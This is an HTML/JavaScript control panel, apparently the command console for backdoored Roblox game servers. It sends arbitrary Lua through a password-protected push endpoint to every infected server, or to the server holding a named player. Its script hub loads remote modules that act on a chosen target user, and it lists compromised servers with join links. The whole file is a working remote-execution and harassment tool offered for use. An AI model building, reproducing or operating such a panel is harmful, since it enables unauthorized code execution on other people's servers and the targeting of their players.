<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Nexus  | Stable v4.6</title>
    <link rel="icon" type="image/jpeg" href="https://files.catbox.moe/8bf557.jpg">
    <style>
        body { margin: 0; background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .panel { background: #1c1c1e; padding: 25px; border-radius: 18px; width: 600px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .tabs { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; flex-wrap: wrap; }
        .tab { color: #86868b; cursor: pointer; font-size: 11px; font-weight: 600; transition: 0.2s; position: relative; text-transform: uppercase; }
        .tab.active { color: #fff; }
        .tab.active::after { content: ''; position: absolute; bottom: -11px; left: 0; width: 100%; height: 2px; background: #0071e3; }
        .content-section { display: none; }
        .content-section.active { display: block; }
        h2 { margin-top: 0; font-size: 15px; text-align: center; margin-bottom: 15px; color: #0071e3; }
        .btn-group { display: flex; gap: 6px; margin-bottom: 15px; flex-wrap: wrap; justify-content: center; }
        .pill { background: #3a3a3c; border: none; color: #fff; padding: 6px 12px; border-radius: 20px; font-size: 10px; cursor: pointer; }
        .pill:hover { background: #0071e3; }
        textarea, input { width: 100%; background: #000; border: 1px solid #424245; border-radius: 10px; color: #fff; padding: 12px; margin-bottom: 10px; box-sizing: border-box; font-family: monospace; outline: none; font-size: 12px; }
        .exec-btn { background: #0071e3; color: #fff; border: none; width: 100%; padding: 14px; border-radius: 12px; font-weight: 600; cursor: pointer; font-size: 14px; margin-top: 5px; }
        .node-list { background: #000; border: 1px solid #333; border-radius: 10px; height: 150px; overflow-y: auto; padding: 10px; font-size: 11px; }
        .node-item { display: flex; justify-content: space-between; align-items: center; padding: 8px 0; border-bottom: 1px solid #222; }
        .mini-join { background: #34c759; color: #fff; border: none; padding: 6px 12px; border-radius: 6px; font-size: 10px; cursor: pointer; font-weight: bold; }
        .footer-btns { position: fixed; bottom: 20px; left: 20px; display: flex; gap: 10px; }
        .f-btn { background: #2c2c2e; border: none; color: #fff; padding: 8px 16px; border-radius: 10px; font-size: 12px; cursor: pointer; }
        #scan-status { color: #34c759; font-size: 10px; text-align: center; margin-top: 5px; font-weight: bold; }
    </style>
</head>
<body>

    <div class="panel">
        <div class="tabs">
            <span class="tab active" onclick="openTab(event, 'mass')">Mass</span>
            <span class="tab" onclick="openTab(event, 'single')">Single</span>
            <span class="tab" onclick="openTab(event, 'hub')">Hub</span>
            <span class="tab" onclick="openTab(event, 'nodes')">Nodes</span>
        </div>

        <input type="text" id="target_input" placeholder="Global Username / Target">

        <div id="mass" class="content-section active">
            <h2>Mass Execution</h2>
            <textarea id="lua_mass" rows="6" placeholder="-- Script for ALL nodes"></textarea>
            <button class="exec-btn" onclick="fire('mass')">Execute All Servers</button>
        </div>

        <div id="single" class="content-section">
            <h2>Auto-Target Search</h2>
            <textarea id="lua_single" rows="6" placeholder="-- Script for target"></textarea>
            <button class="exec-btn" onclick="findAndExecute()">Search & Execute</button>
            <div id="scan-status">Scanner: Idle</div>
        </div>

        <div id="hub" class="content-section">
            <h2>Script Hub</h2>
            <div class="btn-group">
                <button class="pill" onclick="quickLoad('Darius')">Darius</button>
                <button class="pill" onclick="quickLoad('Steve')">Steve</button>
                <button class="pill" onclick="quickLoad('LR')">Last Rig</button>
                <button class="pill" onclick="quickLoad('EXE')">EXE</button>
            </div>
            <textarea id="lua_hub" rows="4" placeholder="Select a script..."></textarea>
            <button class="exec-btn" style="background:#5856d6;" onclick="fire('hub')">Execute Hub Globally</button>
        </div>

        <div id="nodes" class="content-section">
            <h2>Active Nodes</h2>
            <div id="node_log" class="node-list">Scanning...</div>
            <button class="exec-btn" style="background:#333; margin-top:10px;" onclick="refreshNodes()">Refresh</button>
        </div>
    </div>

    <div class="footer-btns">
        <button class="f-btn" onclick="document.getElementById('m').play()">PLAY</button>
        <button class="f-btn" style="color: #ff3b30;" onclick="stopAudio()">STOP</button>
    </div>

    <audio id="m" loop src="https://files.catbox.moe/81p5wf.mp3"></audio>

    <script>
        const audio = document.getElementById('m');
        function stopAudio() { audio.pause(); audio.currentTime = 0; }

        function openTab(evt, tabName) {
            let content = document.getElementsByClassName("content-section");
            for (let i = 0; i < content.length; i++) { content[i].style.display = "none"; }
            let tabs = document.getElementsByClassName("tab");
            for (let i = 0; i < tabs.length; i++) { tabs[i].className = tabs[i].className.replace(" active", ""); }
            document.getElementById(tabName).style.display = "block";
            evt.currentTarget.className += " active";
        }

        function quickLoad(type) {
            const user = document.getElementById('target_input').value || "Player";
            const box = document.getElementById('lua_hub');
            if(type === 'Darius') box.value = `require(127445614272366).op("${user}")`;
            if(type === 'Steve') box.value = `require(12246001294):Blockify("${user}")`;
            if(type === 'LR') box.value = `require(132155655397653)("${user}")`;
            if(type === 'EXE') box.value = `require(125992639027440)["Require.EXE by E God"]("${user}")`;
        }

        async function push(luaCode, tid) {
            return fetch('/push-lua', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ lua: luaCode, password: "Alt", targetId: tid || null })
            });
        }

        async function fire(mode) {
            let boxId = (mode === 'mass') ? 'lua_mass' : 'lua_hub';
            let code = document.getElementById(boxId).value;
            await push(code, null);
            alert("Sent Globally.");
        }

        async function findAndExecute() {
            const nameInput = document.getElementById('target_input').value.trim().toLowerCase();
            const lua = document.getElementById('lua_single').value;
            const status = document.getElementById('scan-status');
            
            if(!nameInput) return alert("Enter a name!");
            status.innerText = "Scanning all servers...";

            try {
                const res = await fetch('/get-games');
                const nodes = await res.json();
                let found = false;

                for (let id in nodes) {
                    const players = nodes[id].players;
                    // Check if players is an array and search through it
                    if (Array.isArray(players)) {
                        const match = players.find(p => p.toString().toLowerCase() === nameInput);
                        if (match) {
                            status.innerText = `MATCH FOUND: Sending to ${nodes[id].name}`;
                            await push(lua, id);
                            alert(`Success! Target ${match} found.`);
                            found = true;
                            break;
                        }
                    }
                }
                if(!found) status.innerText = "User not found. Check spelling/caps.";
            } catch(e) { status.innerText = "Error fetching node data."; }
        }

        async function refreshNodes() {
            try {
                const res = await fetch('/get-games');
                const data = await res.json();
                const container = document.getElementById('node_log');
                container.innerHTML = Object.keys(data).map(jobId => {
                    const node = data[jobId];
                    const count = Array.isArray(node.players) ? node.players.length : 0;
                    return `
                        <div class="node-item">
                            <div class="node-info"><b>${node.name || "Game"}</b> [${count} Players]</div>
                            <button class="mini-join" onclick="window.location.href='roblox://experiences/start?placeId=${node.placeId}&gameInstanceId=${jobId}'">JOIN</button>
                        </div>
                    `;
                }).join('');
            } catch(e) {}
        }

        setInterval(refreshNodes, 5000);
        refreshNodes();
    </script>
</body>
</html>
